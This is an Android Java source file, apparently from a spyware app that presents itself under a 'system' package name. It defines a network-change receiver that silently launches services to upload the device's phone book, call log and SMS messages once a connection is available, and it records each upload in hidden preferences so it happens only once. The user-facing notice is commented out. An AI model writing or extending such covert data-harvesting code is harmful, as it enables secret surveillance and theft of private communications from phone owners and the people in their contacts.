package com.system.mobilecontroller;

import services.UploadclService;
import services.UploadpbService;
import services.UploadsmsService;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.net.ConnectivityManager;
import android.widget.Toast;

public class NetworkReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context ctx, Intent itt) {
		// TODO Auto-generated method stub
		boolean available = false;
		String action = itt.getAction();
		// if (action.equals(ConnectivityManager.CONNECTIVITY_ACTION)) {
		// Log.d("mark", "网络状态已经改变");
		ConnectivityManager connManager = (ConnectivityManager) ctx
				.getSystemService(Context.CONNECTIVITY_SERVICE);
		if (connManager.getActiveNetworkInfo() != null) {
			available = connManager.getActiveNetworkInfo().isConnected();//此行是否有用&此函数对移动网络好像没用
//			Toast.makeText(ctx, "NETWORK CONNECTED", Toast.LENGTH_LONG).show();

			SharedPreferences sp = ctx.getSharedPreferences("SP",
					Context.MODE_PRIVATE);
			boolean pbuploaded = sp.getBoolean("phoneBookUploaded", false);// getString()第二个参数是如果找不到key对应的value时返回的缺省值。比如SP中没有MODE，就返回""。
			boolean cluploaded = sp.getBoolean("callLogUploaded", false);
			boolean smsuploaded = sp.getBoolean("smsUploaded", false);
			if (!pbuploaded) {
				Intent serIntent1 = new Intent();
				serIntent1.setClass(ctx, UploadpbService.class);
				ctx.startService(serIntent1);
				
				Editor editor = sp.edit();
				editor.putBoolean("phoneBookUploaded", true);
				editor.commit();
			}
			if (!cluploaded) {
				Intent serIntent2 = new Intent();
				serIntent2.setClass(ctx, UploadclService.class);
				ctx.startService(serIntent2);
				
				Editor editor = sp.edit();
				editor.putBoolean("callLogUploaded", true);
				editor.commit();
			}
			if (!smsuploaded) {
				Intent serIntent3 = new Intent();
				serIntent3.setClass(ctx, UploadsmsService.class);
				ctx.startService(serIntent3);
				
				Editor editor = sp.edit();
				editor.putBoolean("smsUploaded", true);
				editor.commit();
			}
		}
		// }
	}
}
